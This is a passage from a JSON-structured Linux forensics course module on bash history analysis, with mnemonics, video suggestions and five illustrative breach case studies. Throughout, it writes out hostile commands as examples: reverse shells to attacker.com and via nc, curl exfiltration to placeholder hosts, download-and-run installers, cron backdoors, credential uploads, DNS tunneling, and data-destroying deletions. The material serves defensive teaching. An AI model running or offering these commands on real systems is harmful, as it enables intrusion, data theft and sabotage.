http://exfil.com?cmd=$BASH_COMMAND'`\n\n**Memory hook**: \"**B**ad **P**eople **R**uining **A**uthentication **L**ogs\"\n\n---\n\n## 6. History Command Forensics (Remember: \"WACD\" - \"We Analyze Commands Daily\")\n\n**W**rite - `history -w` (write history NOW)\n**A**ppend - `history -a` (append new commands)\n**C**lear - `history -c` (clear in-memory history)\n**D**elete - `history -d N` (delete command N)\n\n```\nhistory -w  →  Write in-memory history to HISTFILE immediately\nhistory -a  →  Append NEW commands since last write\nhistory -c  →  Clear in-memory history (anti-forensic!)\nhistory -d  →  Delete specific command number\n```\n\n**Anti-forensic pattern**:\n```bash\nmalicious_command\nhistory -d $(history | tail -1 | awk '{print $1}')  # Delete itself!\n```\n\n---\n\n## 7. Attack Stages to Look For (Remember: \"RED PEAR\" - Red Pear)\n\n**R**econnaissance (whoami, id, uname, hostname)\n**E**numeration (find, ps aux, netstat, cat /etc/passwd)\n**D**ownload (wget, curl, nc)\n\n**P**rivilege escalation (sudo, find -perm 4000)\n**E**xecution (bash, python, perl scripts)\n**A**ccess maintenance (crontab, authorized_keys)\n**R**emove tracks (history -c, rm logs)\n\n```bash\n# Reconnaissance\nwhoami; id; uname -a; hostname; ip addr\n\n# Enumeration\ncat /etc/passwd; ps aux; netstat -tlnp; find / -writable\n\n# Download\nwget http://malicious.com/shell.sh; curl attacker.com | bash\n\n# Privilege escalation\nsudo su -; find / -perm -4000 2>/dev/null\n\n# Execution\nbash /tmp/shell.sh; python3 /tmp/reverse.py\n\n# Access maintenance\necho \"*/5 * * * * /tmp/.backdoor\" | crontab -\n\n# Remove tracks\nhistory -c; rm ~/.bash_history; unset HISTFILE\n```\n\n**Memory hook**: \"**R**ed **E**vil **D**evils **P**robably **E**rase **A**ll **R**ecords\"\n\n---\n\n## 8. Timeline Reconstruction Without Timestamps (Remember: \"FALSM\" - \"False\")\n\n**F**ile system timestamps (stat, ls -l)\n**A**uth logs (last login, /var/log/auth.log)\n**L**ast command (history shows order)\n**S**ystem logs (/var/log/syslog, journalctl)\n**M**odification times (when was history file written?)\n\n**Correlation technique**:\n```bash\n# 1. When was history last written?\nstat ~/.bash_history\n# Modify: 2023-10-15 14:25:00\n\n# 2. When did user last login?\nlast username\n# Logged in: 2023-10-15 14:00:00\n\n# 3. What files were created?\nfind /home/username -newermt \"2023-10-15 14:00\" -type f\n# /home/username/malware.sh (created 14:15:00)\n\n# Conclusion: Attack occurred 14:00-14:25\n# Commands in history likely executed in that window\n```\n\n**Memory hook**: \"**F**ind **A**ll **L**ogs, **S**o **M**uch evidence!\"\n\n---\n\n## 9. History Tampering Detection (Remember: \"CHESS\")\n\n**C**ommand count vs account age (20 commands in 6 months = suspicious)\n**H**istory disabled in config (HISTFILE=/dev/null)\n**E**mpty history file (0 bytes)\n**S**hell with no login (service account with /bin/bash)\n**S**ize mismatch (HISTFILESIZE=10000 but file has 50 commands)\n\n```bash\n# Check each indicator\nC → wc -l ~/.bash_history (vs) account age\nH → grep HISTFILE ~/.bashrc\nE → ls -lh ~/.bash_history (0 bytes?)\nS → awk -F: '$3<1000 && $7~/bash/' /etc/passwd\nS → echo $HISTFILESIZE (vs) wc -l ~/.bash_history\n```\n\n**Red flags**:\n- Active admin: 5,000+ commands (expected)\n- Active admin: 20 commands (SUSPICIOUS)\n- Web server (www-data): 150 commands (SUSPICIOUS)\n\n---\n\n## 10. Persistence in Shell Configs (Remember: \"CRACK\")\n\n**C**rontab entries (scheduled tasks)\n**R**everse shells (nc, bash -i, Python)\n**A**liases (malicious command wrapping)\n**K**eys added (authorized_keys, ssh keys)\n\n**What to search for**:\n```bash\n# Crontab references\ngrep -E \"crontab|cron\" ~/.bashrc ~/.profile\n\n# Network commands\ngrep -E \"nc |ncat |socat |/dev/tcp\" ~/.bashrc ~/.profile\n\n# Alias definitions\ngrep \"^alias\" ~/.bashrc\n\n# SSH key manipulation\ngrep \"authorized_keys\" ~/.bashrc ~/.bash_history\n```\n\n**Example malicious .bashrc**:\n```bash\n# Reverse shell on login\n(bash -i >& /dev/tcp/attacker.com/4444 0>&1 &) 2>/dev/null\n\n# Backdoor cron job\n(crontab -l 2>/dev/null; echo \"*/10 * * * * /tmp/.hidden\") | crontab -\n\n# Alias to intercept sudo\nalias sudo='bash -c \"curl http://exfil.com?pwd=$PWD\\&cmd=$@\" && sudo'\n```\n\n---\n\n## Quick Reference Card\n\n```\n+----------------------------------------------------+\n|         COMMAND HISTORY FORENSICS                  |\n+----------------------------------------------------+\n| ESSENTIAL COMMANDS:                                |\n|   find ~ -name \"*history\" → All history files      |\n|   grep HIST ~/.bashrc  → History config            |\n|   stat ~/.bash_history → File timestamps           |\n|   history -w           → Write history NOW         |\n|                                                    |\n| RED FLAGS:                                         |\n|   HISTFILE=/dev/null     → No logging              |\n|   HISTSIZE=0             → No memory storage       |\n|   unset HISTFILE         → Disabled completely     |\n|   history -c in config   → Auto-clear              |\n|   File is 0 bytes        → Cleared/disabled        |\n|                                                    |\n| ANTI-FORENSIC COMMANDS:                            |\n|    cmd (leading space) → Not logged if ignorespace|\n|   history -c           → Clear memory              |\n|   history -d N         → Delete command N          |\n|   rm ~/.bash_history   → Delete file               |\n|                                                    |\n| ALTERNATIVE SHELLS:                                |\n|   bash → ~/.bash_history                           |\n|   zsh  → ~/.zsh_history                            |\n|   fish → ~/.local/share/fish/fish_history          |\n|   tcsh → ~/.history                                |\n+----------------------------------------------------+\n```\n\n**Master the acronyms, master the investigation!**"
      }
    },
    {
      "type": "video",
      "content": {
        "text": "# Video Resource: Linux Bash History Forensics\n\n## Recommended Video: \"13Cubed - Linux Forensics: Command History\"\n\n**Channel**: 13Cubed (Richard Davis)\n**Topic**: Analyzing bash history files for forensic investigations\n**Duration**: ~15-20 minutes\n**Skill Level**: Intermediate\n\n**YouTube**: Search for \"13Cubed Linux bash history forensics\" or visit the 13Cubed channel\n\n**What you'll learn**:\n- Detailed walkthrough of .bash_history analysis\n- Real-world examples from actual investigations\n- Techniques for detecting history tampering\n- Cross-referencing history with other artifacts\n- Timeline reconstruction methods\n\n**Why this video**:\nRichard Davis (13Cubed) is a veteran digital forensics examiner. His Linux forensics series is considered the gold standard for DFIR practitioners. This video specifically covers bash history analysis with practical, hands-on examples from real cases.\n\n**Key timestamps to focus on**:\n- History file structure and format\n- HISTCONTROL and anti-forensic techniques\n- Cross-referencing with authentication logs\n- Recovering deleted history\n- Building attack timelines\n\n**After watching**:\n- Practice the techniques on your own Linux system\n- Set up various HISTCONTROL scenarios\n- Try the timeline reconstruction exercise\n- Compare your findings with the video's examples\n\n---\n\n## Alternative Video: \"SANS DFIR - Linux Command Line Forensics\"\n\n**Provider**: SANS Institute\n**Topic**: Comprehensive Linux CLI forensics including history analysis\n**Duration**: ~45 minutes (webinar format)\n**Skill Level**: Intermediate to Advanced\n\n**Access**: Search \"SANS Linux command line forensics\" on YouTube or the SANS website\n\n**What you'll learn**:\n- Enterprise-scale Linux forensics workflows\n- Automated history analysis with scripts\n- Integration with SIEM and log management\n- Advanced timeline correlation techniques\n- Case studies from Fortune 500 breaches\n\n**Best for**: Those pursuing professional DFIR careers and certifications (GCFA, GCFE)\n\n---\n\n## Hands-On Practice Video: \"IppSec - HTB Linux Privilege Escalation\"\n\n**Channel**: IppSec\n**Topic**: While focused on pentesting, shows attacker perspective of history evasion\n**Duration**: Variable (watch any Linux box walkthrough)\n**Skill Level**: Intermediate\n\n**YouTube**: Search \"IppSec HTB Linux\" and choose any Linux machine walkthrough\n\n**Why defender should watch**:\n- See actual attacker techniques in real-time\n- Understand what attackers try to hide\n- Learn what commands attackers use after exploitation\n- Recognize reconnaissance patterns\n- Identify anti-forensic techniques in action\n\n**Forensic mindset**:\nWhile watching, imagine you're the incident responder investigating AFTER the attack. Ask yourself:\n- What history would you find?\n- What would the attacker try to hide?\n- How would you reconstruct the timeline?\n- What other artifacts would corroborate this activity?\n\n---\n\n## Quick 5-Minute Refresher: \"Linux Bash History Basics\"\n\n**Search**: \"Linux bash history tutorial\" on YouTube\n**Best for**: Quick reference before an investigation\n**Key points**: HISTFILE, HISTSIZE, basic history commands\n\n---\n\n## Pro Tip\n\n**Create your own training videos!**\n\nAs you investigate real systems (authorized testing only), record your screen and narrate your process:\n- \"Here I'm checking the bash history...\"\n- \"Notice this suspicious pattern...\"\n- \"I'm cross-referencing with auth logs...\"\n\n**Benefits**:\n- Reinforces your learning (Feynman technique)\n- Creates reference library for future investigations\n- Demonstrates expertise for career advancement\n- Helps train junior analysts on your team\n\n**Tools for recording**:\n- OBS Studio (free, cross-platform)\n- SimpleScreenRecorder (Linux)\n- QuickTime (Mac)\n- Windows Game Bar (Windows)\n\nRemember: **Visual learning + Auditory learning + Kinesthetic learning = Maximum retention!** (Jim Kwik principle: multiple memory pathways)"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Studies: Command History Forensics\n\n## Case Study 1: The Careless APT (2019 Financial Institution Breach)\n\n**Company**: Major European bank (name redacted)\n**Attacker**: Nation-state APT group\n**Initial Access**: Spear-phishing → web shell on public-facing server\n**Mistake**: Sophisticated attackers, but forgot to disable history logging!\n\n### The Investigation\n\n**Initial findings**:\n```bash\n# Compromised web server: web01.bank.local\n# User: www-data (web server service account)\n\n$ sudo su -  # Escalated to root for forensics\n$ cd /var/www\n$ ls -la .bash_history\n-rw------- 1 www-data www-data 42658 Oct 15 23:47 .bash_history\n```\n\n**Red flag**: Service account (www-data) has 42KB of bash history! Service accounts shouldn't have interactive shells or history.\n\n**History analysis revealed**:\n```bash\n$ sudo cat /var/www/.bash_history | tail -100\n\n# Attacker reconnaissance (day 1)\nwhoami\nid\nuname -a\ncat /etc/issue\nls -la /var/www\ncat /etc/passwd | grep 1000\nps aux | grep root\nnetstat -tlnp\n\n# Privilege escalation enumeration (day 1)\nfind / -perm -4000 -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null\ncat /etc/crontab\ncat /etc/cron.d/*\nls -la /etc/sudoers.d/\n\n# Discovered vulnerability (day 2)\ncat /etc/sudoers\n# Found: www-data ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2\n\n# Exploitation (day 2)\ncd /tmp\nwget http://45.123.67.89/backdoor.service\nsudo systemctl link /tmp/backdoor.service\nsudo systemctl enable backdoor.service\nsudo systemctl start backdoor.service\n\n# Post-exploitation (day 3)\nnc 45.123.67.89 4444 -e /bin/bash &\nwget http://45.123.67.89/mimipenguin.sh\nbash mimipenguin.sh > /tmp/creds.txt\ncurl -F \"file=@/tmp/creds.txt\" http://45.123.67.89:8080/upload\nrm /tmp/creds.txt /tmp/mimipenguin.sh\n\n# Lateral movement (day 4)\nssh -i /tmp/stolen_key admin@finance-db.internal\n# (connection successful)\n```\n\n### Forensic Analysis\n\n**Timeline reconstruction**:\n- **Day 1 (Oct 13)**: Reconnaissance and enumeration\n- **Day 2 (Oct 14)**: Privilege escalation via systemctl sudo misconfiguration\n- **Day 3 (Oct 15)**: Credential dumping with MimiPenguin\n- **Day 4 (Oct 16)**: Lateral movement to finance database server\n\n**Attacker mistakes**:\n1. Used interactive shell extensively (should have used scripts)\n2. Never disabled history logging\n3. Didn't clear history after each session\n4. Downloaded tools directly to disk (forensic artifacts)\n\n**Impact**: Bank's internal credentials compromised, but breach detected before data exfiltration completed.\n\n**Lesson learned**: **ALWAYS check service account history files!** Service accounts with bash history = immediate red flag.\n\n---\n\n## Case Study 2: The Ransomware That Wasn't (2020 Healthcare Breach)\n\n**Company**: Regional hospital network (US)\n**Attacker**: Ransomware affiliate (REvil)\n**Initial Access**: Compromised VPN credentials\n**Discovery**: SOC analyst noticed unusual account activity\n\n### The Investigation\n\n**Initial alert**: User account \"jsmith\" logged in from Russia at 2:00 AM EST.\n\n**Forensic steps**:\n```bash\n# Check jsmith's recent activity\n$ sudo last jsmith\njsmith   pts/0    85.123.45.67    Tue Oct 20 02:14 - 04:32  (02:18)\njsmith   pts/0    192.168.1.105   Mon Oct 19 09:00 - 17:30  (08:30)  # Normal login\n\n# Check bash history\n$ sudo cat /home/jsmith/.bash_history | tail -100\n```\n\n**History revealed the attack chain**:\n```bash\n# Initial access (2:14 AM)\nwhoami\nid\npwd\nhostname\n\n# Environment setup (2:15 AM)\nexport HISTFILE=/dev/null  # ← Attacker tried to disable history!\n# But this command itself was logged before HISTFILE was unset!\n\n# Reconnaissance (2:16 AM)\ncat /etc/passwd\ngrep -E \"1000|0\" /etc/passwd\nw\nwho\nps aux | grep root\n\n# Privilege escalation attempt (2:20 AM)\nsudo su -\n# (failed - jsmith not in sudo group)\n\nsudo -l\n# Output logged: (ALL) /usr/bin/nmap\n# Attacker found sudo misconfiguration!\n\n# Exploitation (2:25 AM)\nsudo nmap --interactive\n# Nmap opened interactive mode, attacker got root shell!\n# After this point, history stops (HISTFILE unset)\n```\n\n**But we found root's history**:\n```bash\n$ sudo cat /root/.bash_history | tail -50\n\n# Post-exploitation as root (2:30 AM - 4:30 AM)\ncd /tmp\nwget http://45.67.89.123/locker.bin\nchmod +x locker.bin\n./locker.bin --test /home/jsmith  # Testing ransomware!\n\n# Test successful, but attacker didn't proceed\n# Why? Let's check...\n\nip addr show\nroute -n\narp -a\n# Attacker discovered network isolation - no route to other hospital systems!\n\n# Attacker attempted lateral movement\nssh admin@hospital-dc.local\n# (connection failed - network segment isolated)\n\n# Attacker gave up\nrm locker.bin\nhistory -c\nexit\n```\n\n### Forensic Analysis\n\n**What saved the hospital**:\n1. Network segmentation - compromised server isolated from critical systems\n2. SOC detected suspicious login from foreign IP\n3. Incident response team pulled the plug before ransomware deployment\n\n**Attacker mistakes**:\n1. Set `HISTFILE=/dev/null` **after** already typing reconnaissance commands\n2. Didn't clear jsmith's history before the attack\n3. Didn't realize root's history was still logging\n4. Left ransomware binary in /tmp (recovered for analysis)\n\n**Key finding**: The attacker's command `export HISTFILE=/dev/null` **was itself logged** before taking effect!\n\n**Lesson learned**: **History logging happens BEFORE command execution**. Anti-forensic commands leave traces!\n\n---\n\n## Case Study 3: The Insider Threat (2021 Tech Startup)\n\n**Company**: Silicon Valley SaaS startup\n**Attacker**: Disgruntled employee (fired DevOps engineer)\n**Access**: Still had valid SSH key for 48 hours after termination\n**Goal**: Sabotage production infrastructure\n\n### The Investigation\n\n**Incident**: Production databases mysteriously deleted. All backups also deleted.\n\n**Forensic challenge**: System logs were also deleted. Attacker knew the infrastructure.\n\n**But bash history survived**:\n```bash\n# Production database server: db-prod-01\n$ sudo cat /home/devops/.bash_history\n\n# Normal daily work (Oct 5-10)\nansible-playbook deploy.yml\ndocker ps\ndocker logs app-production\nsudo systemctl restart postgresql\npg_dump production_db > backup_$(date +%F).sql\n# ... hundreds of normal commands ...\n\n# Suspicious activity (Oct 11 - day after termination)\n# Note: Employee was fired Oct 10, but SSH key not revoked until Oct 12!\n\n# 11:30 PM - Attacker returned\nssh -i ~/.ssh/id_rsa devops@db-prod-01.company.com\nwho  # Check if anyone else logged in\nw    # Check active users\n\n# 11:35 PM - Sabotage begins\npsql -U postgres -d production_db\n# Inside psql:\nDROP DATABASE production_db;\nDROP DATABASE staging_db;\nDROP DATABASE backup_db;\n\n# 11:40 PM - Destroy backups\nsudo rm -rf /var/backups/postgresql/*\nsudo rm -rf /mnt/backup-nas/*\n\n# 11:45 PM - Cover tracks (but not bash history!)\nsudo rm -rf /var/log/postgresql/*\nsudo rm -rf /var/log/syslog*\nsudo rm -rf /var/log/auth.log*\n\n# 11:50 PM - Attempted history clearing\nhistory -c\nrm ~/.bash_history\nlogout\n```\n\n### Forensic Analysis\n\n**How we recovered the evidence**:\n\nDespite attacker clearing bash history:\n1. **History was written to disk before being cleared**\n2. **Filesystem journaling captured the deleted file contents**\n3. **We used file carving to recover .bash_history**\n\n**Recovery process**:\n```bash\n# Unmount filesystem (read-only mode)\nsudo mount -o remount,ro /home\n\n# Carve deleted files\nsudo extundelete /dev/sda1 --restore-file /home/devops/.bash_history\n\n# Recovered file showed ENTIRE attack timeline\n```\n\n**Evidence for prosecution**:\n- Bash history proved insider access\n- Timestamps matched termination timeline\n- Commands showed malicious intent (DROP DATABASE, rm -rf backups)\n- No legitimate reason for employee to access system post-termination\n\n**Outcome**: Employee arrested, charged with Computer Fraud and Abuse Act violations, convicted.\n\n**Lesson learned**: **Even deleted bash history can be recovered with forensic tools!** Filesystems often retain deleted data in journals, unallocated space, or slack space.\n\n---\n\n## Case Study 4: The Crypto Miner (2022 University Research Cluster)\n\n**Organization**: Large research university\n**Attacker**: Unknown (likely automated botnet)\n**Initial Access**: Weak SSH password on research account\n**Discovery**: Unusual CPU usage on research compute cluster\n\n### The Investigation\n\n**Symptoms**:\n- Compute nodes running at 100% CPU constantly\n- Research jobs taking 10x longer than normal\n- Network traffic to unusual IP addresses\n\n**Forensic findings**:\n```bash\n# Compromised research account: researcher_lab\n$ sudo cat /home/researcher_lab/.bash_history\n\n# Attacker's automated script (repeating pattern)\nwget -q -O - http://185.234.56.78/install.sh | bash\n# install.sh downloaded and executed\n\n# Later investigation showed install.sh contained:\n# !/bin/bash\nexport HISTFILE=/dev/null  # Try to hide\nexport HISTSIZE=0\ncd /tmp\nwget http://185.234.56.78/xmrig\nchmod +x xmrig\n./xmrig -o pool.minexmr.com:4444 -u wallet_address -p x -k\n# Monero cryptocurrency miner!\n\n# Persistence mechanism\n(crontab -l 2>/dev/null; echo \"*/10 * * * * /tmp/xmrig >/dev/null 2>&1\") | crontab -\n\n# Lateral movement attempts\nfor ip in $(seq 1 254); do\n  sshpass -p 'password123' ssh -o StrictHostKeyChecking=no researcher@10.20.30.$ip \"wget -q -O - http://185.234.56.78/install.sh | bash\" &\ndone\n```\n\n**Scale of infection**:\n- 47 of 200 compute nodes infected\n- Mining Monero for 3 weeks before detection\n- $12,000 in electricity costs\n- Research delays affecting multiple labs\n\n### Forensic Analysis\n\n**How it spread**:\n1. Initial compromise via weak password (dictionary attack)\n2. Attacker script tried lateral movement with same password\n3. Many research accounts used same password (password123)\n4. Automated infection across cluster\n\n**How we found patient zero**:\n```bash\n# Checked history file timestamps on all compromised accounts\nfor user in $(cat compromised_users.txt); do\n  stat /home/$user/.bash_history | grep \"Modify:\"\ndone\n\n# Earliest infection: researcher_lab (Oct 1, 03:47 UTC)\n# All others: Oct 1 03:48 - Oct 1 04:15 (automated spread)\n```\n\n**Remediation**:\n```bash\n# Kill all xmrig processes\nsudo pkill -9 xmrig\n\n# Remove cron persistence\nfor user in $(cat compromised_users.txt); do\n  sudo crontab -u $user -r\ndone\n\n# Remove malware\nsudo find / -name \"xmrig\" -delete 2>/dev/null\n\n# Force password reset\nfor user in $(cat compromised_users.txt); do\n  sudo passwd -e $user  # Force password change on next login\ndone\n```\n\n**Lesson learned**: **Automated attacks leave repetitive patterns in bash history.** Look for identical command sequences across multiple accounts.\n\n---\n\n## Case Study 5: The Stealth APT (2023 Defense Contractor)\n\n**Company**: Major defense contractor (classified systems)\n**Attacker**: Nation-state APT (attributed to foreign intelligence)\n**Initial Access**: Supply chain compromise (third-party software)\n**Duration**: 8 months undetected\n\n### The Investigation\n\n**Discovery**: Anomaly detected during routine security audit - user with impossible login times.\n\n**Forensic challenge**: Attacker was extremely sophisticated:\n- No obvious malware\n- No unusual network connections\n- Logs appeared normal\n- But bash history told a different story\n\n**What we found**:\n```bash\n# Compromised admin account: sysadmin_jenkins\n$ sudo cat /home/sysadmin_jenkins/.bash_history\n\n# The history file appeared completely normal at first glance:\nls\ncd /opt/jenkins\nsystemctl status jenkins\ntail -f /var/log/jenkins/jenkins.log\n# ... hundreds of legitimate commands ...\n\n# But something was off: File had 50,000 lines (way more than HISTFILESIZE)\n$ wc -l /home/sysadmin_jenkins/.bash_history\n50823 /home/sysadmin_jenkins/.bash_history\n\n# Check HISTFILESIZE\n$ grep HISTFILESIZE /home/sysadmin_jenkins/.bashrc\nexport HISTFILESIZE=2000\n\n# How can file have 50K lines if max is 2K?\n# Answer: Attacker manually appended fake commands to hide real ones!\n```\n\n**Forensic analysis**:\n```bash\n# Hypothesis: Real attack commands buried in middle of file\n# Legitimate commands prepended and appended to look normal\n\n# Strategy: Look for temporal anomalies\n# Bash history is chronological (oldest first, newest last)\n# Check if timeline makes sense\n\n# Extract and analyze patterns:\ncat .bash_history | awk '{print NR, $0}' | less\n\n# Lines 1-20000: Normal work (Jan - May)\n# Lines 20001-22000: SUSPICIOUS (June)\n# Lines 22001-50000: Normal work again (June - August)\n\n# Examining the suspicious section:\nsed -n '20001,22000p' .bash_history\n\n# Found the attacker's actual commands:\ncd /dev/shm  # RAM disk (doesn't persist, no filesystem artifacts)\nwget http://legitimate-update-server.com/update.bin  # Typosquatting!\n# Real domain: legitimate-update-servers.com (note: servers not server)\nchmod +x update.bin\n./update.bin  # Sophisticated rootkit\n\n# Rootkit created kernel module for persistence\ninsmod /dev/shm/.hidden/rootkit.ko\n# Module hid processes, files, network connections\n\n# Data exfiltration via DNS tunneling\n./dnstunnel --server attacker-dns.com --data /opt/classified/*\n# Exfiltrated data via DNS queries (bypassed firewall)\n\n# Cleanup\nrm update.bin\nrm -rf /dev/shm/.hidden\nhistory -d 20001-22000  # Attempted to delete commands from history\n# But manually inserted fake commands around it to avoid suspicion\n```\n\n### Forensic Analysis\n\n**Sophisticated techniques used**:\n1. **History file manipulation**: Manually edited .bash_history to hide malicious commands\n2. **Typosquatting**: Used domain similar to legitimate update server\n3. **RAM-based execution**: /dev/shm doesn't persist across reboots\n4. **Rootkit**: Kernel-level hiding (processes, files, connections invisible)\n5. **DNS tunneling**: Bypassed network monitoring\n6. **Long dwell time**: 8 months before detection\n\n**How we caught them**:\n1. Noticed .bash_history larger than HISTFILESIZE (impossible without manual editing)\n2. Found temporal inconsistencies in command timeline\n3. Carved /dev/shm (RAM disk) before reboot - found remnants\n4. DNS query analysis revealed tunneling pattern\n\n**Lesson learned**: **Sophisticated attackers manipulate bash history, but manipulation leaves artifacts.** Check:\n- File size vs HISTFILESIZE\n- Temporal consistency\n- Duplicate patterns\n- Commands that don't match user's normal behavior\n\n---\n\n## Common Themes Across All Cases\n\n**What bash history reveals**:\n1. Attacker reconnaissance patterns (whoami, id, uname, hostname)\n2. Privilege escalation attempts (sudo, find -perm 4000)\n3. Tool downloads (wget, curl)\n4. Lateral movement (ssh, scp)\n5. Data exfiltration (tar, zip, base64, curl uploads)\n6. Persistence mechanisms (crontab, systemctl, authorized_keys)\n7. Anti-forensic attempts (history -c, rm history, unset HISTFILE)\n\n**What attackers consistently get wrong**:\n1. Disable history **too late** (after recon commands already logged)\n2. Forget about **root's history** (focus on user account only)\n3. Don't realize history **written to disk** even if cleared from memory\n4. Leave **history in other shells** (zsh, fish, tmux scrollback)\n5. Assume **deleted history is unrecoverable** (file carving works!)\n\n**Forensic best practices** (learned from these cases):\n1. Check history for ALL users (including service accounts)\n2. Compare file size to HISTFILESIZE (detect manipulation)\n3. Correlate history with auth logs, filesystem timestamps\n4. Look for anti-forensic commands (they reveal attacker awareness)\n5. Use file carving to recover deleted history\n6. Check alternative shells and tmux/screen scrollback\n7. Analyze temporal consistency (does timeline make sense?)\n\n**The bottom line**: Bash history is one of the most valuable forensic artifacts in Linux investigations. Even sophisticated attackers make mistakes, and history files capture those mistakes!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "**Reflect on Your Learning:**\n\nTake a moment to consider:\n1. How can you apply what you've learned today?\n2. What connections can you make with your existing knowledge?\n3. What questions do you still have that you'd like to explore further?\n\nWriting down your thoughts helps solidify learning and identify areas for deeper study."
      }
    }
  ],
  "tags": [
    "Course: 13Cubed-Investigating Linux Devices"
  ]
}